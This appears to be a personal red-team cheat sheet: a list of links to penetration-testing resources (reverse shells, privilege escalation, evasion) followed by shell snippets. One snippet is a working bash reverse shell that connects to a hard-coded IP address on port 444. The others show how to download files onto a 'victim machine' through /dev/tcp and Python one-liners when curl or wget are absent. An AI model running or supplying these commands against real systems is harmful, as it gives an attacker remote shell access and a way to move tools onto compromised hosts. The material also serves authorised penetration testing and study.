# Security - Red Team

- https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-detection-using-proxychains-0154619/
- https://www.hackwhackandsmack.com/?p=1021
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://github.com/danielmiessler/SecLists
- https://redteamjournal.com/2017/02/the-2017-red-teamers-bookshelf/
- https://andreafortuna.org/reverse-shells-with-netcat-some-use-cases-cc3aba835656
- http://seclist.us/pyjenkinstoolkit-is-a-jenkins-penetration-test-toolkit.html
- https://pen-testing.sans.org/blog/2017/02/02/pen-test-poster-white-board-bash-bashs-built-in-netcat-client
- https://www.pentesterlab.com/exercises/play_xxe/course
- https://www.hackthissite.org/
- https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://tools.kali.org/information-gathering/enum4linux


### Reverse Shell
```shell
# Reverse shell with your attacking box is listening on port 444
/bin/bash -i > /dev/tcp/64.228.93.35/444 0<&1 2>&1 
```

### Download Files
You may not always have `curl` or `wget` available to download files on the victim machine.

```shell
exec 3<>/dev/tcp/ahermosilla.com/80
echo -e "GET / HTTP/1.1\r\nHost: ahermosilla.com\r\nConnection: close\r\n\r\n" >&3
cat <&3

# Python 3.x
python -c 'import urllib.request; urllib.request.urlopen("http://example.com/").read()'

# Python 2.7
python -c 'import urllib2; print urllib2.urlopen("http://example.com/").read()'
```
- https://stackoverflow.com/questions/645312/what-is-the-quickest-way-to-http-get-in-python
- http://xmodulo.com/tcp-udp-socket-bash-shell.html